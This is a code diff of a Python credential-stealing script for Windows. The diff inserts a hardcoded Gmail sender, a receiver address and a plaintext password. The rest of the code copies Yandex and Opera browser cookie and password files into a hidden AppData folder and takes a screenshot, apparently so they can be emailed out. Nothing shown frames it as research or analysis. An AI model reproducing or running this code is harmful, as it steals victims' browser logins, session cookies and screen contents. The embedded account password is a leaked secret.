@@ -20,9 +20,9 @@ from email.mime.text import MIMEText
 
 user = getpass.getuser()
 
-sender = ""
-receiver = ""
-password = ""
+sender = "parsersenderink@gmail.com"
+receiver = "andrewvorobey123@gmail.com"
+password = "PaladinsPip123"
 
 try:
     os.mkdir(rf"C:\\Users\\{user}\\AppData\\files")
@@ -49,21 +49,21 @@ try:
 
     if (os.path.exists(YandexCookie)) == True:
         os.mkdir(Path + r"\\Yandex")
-        shutil.copyfile(YandexCookie, Path + r"\\Yandex/Yandex Browser cookie", follow_symlinks=True)
+        shutil.copyfile(YandexCookie, Path + r"\\Yandex\\Yandex Browser cookie", follow_symlinks=True)
 
     if (os.path.exists(YandexPass)) == True:
         if not os.path.exists(Path + r"\\Yandex"):
             os.mkdir(Path + r"\\Yandex")
-        shutil.copyfile(YandexPass, Path + r"\\Yandex/Yandex Browser passwords", follow_symlinks=True)
+        shutil.copyfile(YandexPass, Path + r"\\Yandex\\Yandex Browser passwords", follow_symlinks=True)
 
     if (os.path.exists(OperaCookie)) == True:
         os.mkdir(Path + r"\\Opera")
-        shutil.copyfile(OperaCookie, Path + r"\\Opera/Opera Cookie", follow_symlinks=True)
+        shutil.copyfile(OperaCookie, Path + r"\\Opera\\Opera Cookie", follow_symlinks=True)
 
     if (os.path.exists(OperaPass)) == True:
         if not os.path.exists(Path + r"\\Opera"):
             os.mkdir(Path + r"\\Opera")
-        shutil.copyfile(OperaPass, Path + r"\\Opera/Opera Passwords", follow_symlinks=True)
+        shutil.copyfile(OperaPass, Path + r"\\Opera\\Opera Passwords", follow_symlinks=True)
 
     screen = ImageGrab.grab()
     screen.save(os.getenv("APPDATA") + rf'\\{user}-sreenshot.jpg')
